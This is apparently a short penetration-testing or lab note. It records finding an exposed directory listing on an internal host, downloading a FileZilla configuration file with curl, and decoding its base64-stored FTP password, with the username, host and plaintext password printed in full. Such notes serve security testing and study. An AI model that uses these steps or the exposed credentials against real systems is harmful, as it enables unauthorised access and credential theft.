Directory listing exposing files at http://172.16.5.127/files



![[Pasted image 20220602192717.png]]

```bash
curl http://172.16.5.127/files/filezilla.xml -o filezilla.xml
cat filezilla.xml
                        <Host>72.47.233.26</Host>

                        <Port>21</Port>

                        <Protocol>0</Protocol>

                        <Type>0</Type>

                        <User>librarian</User>

                        <Pass encoding="base64">bnJsMkAqZk5zNQ==</Pass>

                        <Logontype>1</Logontype>

                        <TimezoneOffset>0</TimezoneOffset>

                        <PasvMode>MODE_DEFAULT</PasvMode>

                        <MaximumMultipleConnections>0</MaximumMultipleConnections>

                        <EncodingType>Auto</EncodingType>


```
![[Pasted image 20260126155849.png]]
```bash
echo bnJsMkAqZk5zNQ== | base64 -d
nrl2@*fNs5
```


----


